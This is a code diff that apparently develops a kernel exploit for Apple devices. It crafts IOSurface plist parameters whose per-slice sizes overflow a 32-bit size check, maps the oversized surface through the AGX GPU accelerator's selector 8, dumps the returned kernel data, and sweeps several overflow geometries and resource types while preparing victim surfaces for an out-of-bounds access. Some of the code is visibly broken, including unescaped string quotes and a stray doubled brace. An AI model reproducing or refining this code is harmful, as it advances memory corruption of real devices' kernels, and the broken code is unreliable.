@@ -96,44 +96,45 @@ static NSString *normal_xml(void) {
     "</dict></plist>\n";
 }
 
-// F1 shape:
-//   dataPerSlice   = 0x4000
-//   headerPerSlice = 0x40000000
-//   slices         = 4
-//   (data + header) * slices = 0x100010000 -> 32-bit 0x10000
-//   planeSize = 0x10000, so the kernel check passes.
-// The true logical region is 0x100010000 (4 GiB + 64 KiB).
-static NSString *f1_xml(void) {
-    return @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
-    "<plist version=\"1.0\"><dict>"
-    "<key>IOSurfaceWidth</key><integer>64</integer>"
-    "<key>IOSurfaceHeight</key><integer>64</integer>"
-    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
-    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
-    "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
-    "<key>IOSurfaceSliceCount</key><integer>4</integer>"
-    "<key>IOSurfacePlaneInfo</key><array><dict>"
-    "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
-    "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
-    "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
-    "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
-    "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
-    "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
-    "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
-    "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
-    "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
-    "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
-    "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
-    "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
-    "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
-    "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
-    "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
-    "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>"
-    "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
-    "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
-    "</dict></array></dict></plist>\n";
+// Parametrized F1 surface: constants identical to the original f1_xml (4/0x40000000/0x4000).
+static NSString *f1_xml2(uint32_t slices, uint64_t data, uint64_t hdr) {
+    return [NSString stringWithFormat:
+        @"<?xml version="1.0" encoding="UTF-8"?>
+"
+        "<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+"
+        "<plist version="1.0"><dict>"
+        "<key>IOSurfaceWidth</key><integer>64</integer>"
+        "<key>IOSurfaceHeight</key><integer>64</integer>"
+        "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+        "<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+        "<key>IOSurfaceSliceCount</key><integer>%u</integer>"
+        "<key>IOSurfacePlaneInfo</key><array><dict>"
+        "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
+        "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
+        "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
+        "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
+        "<key>IOSurfacePlaneSize</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
+        "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>%llu</integer>"
+        "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>%llu</integer>"
+        "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
+        "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
+        "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
+        "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
+        "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
+        "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
+        "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
+        "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer>"
+        "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
+        "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
+        "</dict></array></dict></plist>
+",
+        slices, (unsigned long long)data, (unsigned long long)hdr];
 }
+
+static NSString *f1_xml(void) { return f1_xml2(4, 0x4000ULL, 0x40000000ULL); }
 
 // Raw IOSurfaceRoot selector 0 (the same in-band XML path used by the kernel parser).
 static uint32_t create_surface(io_connect_t conn, NSString *xml, const char *tag) {
@@ -193,13 +194,8 @@ static io_service_t find_agx_service(void) {
 
 // AGX accelerator selector 8, type 0x82: build a GPU resource from an IOSurface.
 // out+0x00 = GPU VA of the resource, out+0x28 = resource length/span.
-static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
-    *span = 0;
-    *out_ac = 0;
-// Enumerate the IOService plane and return the first AGXAccelerator* service.
-// The accelerator class name differs per SoC (e.g. AGXAcceleratorG14P on
-// T8110/A15), so a hardcoded name breaks on other devices. Log every AGX*
-// class seen so the log shows the actual name on the target.
+// Open the AGX accelerator device user client (type 1) once.
+static io_connect_t agx_open_device(void) {
     io_service_t agx = find_agx_service();
     if (!agx) {
         L(@"[AGX] no accelerator service to open");
@@ -207,53 +203,77 @@ static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
     }
     char cls[128] = {0};
     IOObjectGetClass(agx, cls);
-    L(@"[AGX] opening %s", cls);
     io_connect_t ac = 0;
     kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &ac);
     IOObjectRelease(agx);
     L(@"[AGX] IOServiceOpen(type=1) -> 0x%x conn=0x%x", kr, ac);
     if (kr != KERN_SUCCESS) return 0;
+    return ac;
+}
 
+// selector 8 probe with explicit resource type/flags.
+typedef struct {
+    uint64_t ga, span, obj, v30, v38, v50;
+} agxsel8_t;
+
+static kern_return_t agx_sel8(io_connect_t ac, uint32_t type, uint32_t flags, uint32_t sid, int verbose, agxsel8_t *r) {
     uint8_t *in = calloc(1, 0x100);
     uint8_t *out = calloc(1, 0x1000);
-    *(uint32_t *)(in + 0x00) = 0x82;  // resource type
-    *(uint32_t *)(in + 0x34) = 0;     // reserved/flags
-    *(uint32_t *)(in + 0x38) = sid;   // IOSurface ID
-    *(uint32_t *)(in + 0x3c) = 0;     // reserved/flags
+    *(uint32_t *)(in + 0x00) = type;
+    *(uint32_t *)(in + 0x34) = flags;
+    *(uint32_t *)(in + 0x38) = sid;
     size_t osz = 0x1000;
-    kr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
-    uint64_t ga = rd64(out + 0x00);
-    uint64_t sp = rd64(out + 0x28);
-    uint64_t obj = rd64(out + 0x10);
-    L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx out10=0x%llx out18=0x%llx",
-      kr, ga, sp, obj, rd64(out + 0x18));
-    // G17P: dump every nonzero qword so we can see where the real span lives
-    for (size_t o = 0; o < 0x100; o += 8) {
-        uint64_t v = rd64(out + o);
-        if (v) L(@"[AGXOUT] +0x%03zx = 0x%016llx", o, (unsigned long long)v);
+    kern_return_t kr = IOConnectCallMethod(ac, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
+    r->ga = rd64(out + 0x00);
+    r->span = rd64(out + 0x28);
+    r->obj = rd64(out + 0x10);
+    r->v30 = rd64(out + 0x30);
+    r->v38 = rd64(out + 0x38);
+    r->v50 = rd64(out + 0x50);
+    if (verbose) {
+        L(@"[TPE] t=0x%u f=0x%x sid=%u kr=0x%x ga=0x%llx span=0x%llx v30=0x%llx",
+          type, flags, sid, kr, r->ga, r->span, r->v30);
+        if (r->span > 0x10000)
+            L(@"[TPE] *** BIG SPAN t=0x%u f=0x%x span=0x%llx ***", type, flags, r->span);
+        for (size_t o = 0; o < 0x60; o += 8) {
+            uint64_t v = rd64(out + o);
+            if (v) L(@"[TPEOUT] +0x%02zx = 0x%016llx", o, (unsigned long long)v);
+        }
     }
-    if (obj) {
+    free(in);
+    free(out);
+    return kr;
+}
+
+// Baseline mapping used by the Metal stage (identical semantics to the v2/v3 build).
+static uint64_t agx_map(uint32_t sid, uint64_t *span, io_connect_t *out_ac) {
+    *span = 0;
+    *out_ac = 0;
+    io_connect_t ac = agx_open_device();
+    if (!ac) return 0;
+    agxsel8_t r;
+    kern_return_t kr = agx_sel8(ac, 0x82, 0, sid, 1, &r);
+    L(@"[AGX] sel8=0x%x gpuVA=0x%llx span=0x%llx", kr, r.ga, r.span);
+    if (r.obj) {
         uint8_t *buf = calloc(1, 0x200);
         mach_vm_size_t sz = 0x200;
-        kern_return_t mr = mach_vm_read_overwrite(mach_task_self(), obj, 0x200,
+        kern_return_t mr = mach_vm_read_overwrite(mach_task_self(), r.obj, 0x200,
                                                   (mach_vm_address_t)buf, &sz);
-        L(@"[AGX] vm_read(0x%llx) -> 0x%x size=0x%llx", obj, mr, (unsigned long long)sz);
+        L(@"[AGX] vm_read(0x%llx) -> 0x%x size=0x%llx", r.obj, mr, (unsigned long long)sz);
         if (mr == KERN_SUCCESS) {
             for (size_t o = 0; o < 0x200; o += 8)
                 L(@"[AGXOBJ] +0x%03zx = 0x%016llx", o, (unsigned long long)rd64(buf + o));
         }
         free(buf);
     }
-    free(in);
-    free(out);
     if (kr != KERN_SUCCESS) {
         IOServiceClose(ac);
         return 0;
     }
-    *span = sp;
-    *out_ac = ac;  // keep open: the resource lives with the connection
-    return ga;
-}
+    *span = r.span;
+    *out_ac = ac;
+    return r.ga;
+}}
 
 // Create 32 normal IOSurfaces after F1, fill them with a pattern. They reproduce
 // the allocator/VA layout of the original probe; the actual OOB target is the
@@ -506,6 +526,31 @@ static void run(void) {
 
     IOSurfaceRef ios_victims[32];
     int ivc = create_iosurface_victims(ios_victims, 32);
+
+    // ---- selector/geometry battery (connections freed before the Metal stage) ----
+    io_connect_t acb = agx_open_device();
+    if (acb) {
+        struct { uint32_t s; uint64_t h, d; } gc[4];
+        gc[0].s = 8;  gc[0].h = 0x20000000ULL; gc[0].d = 0x2000ULL;
+        gc[1].s = 2;  gc[1].h = 0x80000000ULL; gc[1].d = 0x8000ULL;
+        gc[2].s = 16; gc[2].h = 0x10000000ULL; gc[2].d = 0x1000ULL;
+        gc[3].s = 4;  gc[3].h = 0x40000000ULL; gc[3].d = 0x4000ULL;
+        for (size_t j = 0; j < 4; j++) {
+            char tag[16];
+            snprintf(tag, sizeof(tag), "G%zu", j);
+            uint32_t gsid = create_surface(conn, f1_xml2(gc[j].s, gc[j].d, gc[j].h), tag);
+            if (gsid) {
+                agxsel8_t gr;
+                agx_sel8(acb, 0x82, 0, gsid, 1, &gr);
+            }
+        }
+        for (uint32_t ty = 0x80; ty <= 0x8b; ty++) {
+            agxsel8_t tr;
+            agx_sel8(acb, ty, 0, sid, 1, &tr);
+        }
+        IOServiceClose(acb);
+    }
+    // ---- end battery ----
 
     uint64_t agx_span = 0;
     io_connect_t agx_conn = 0;
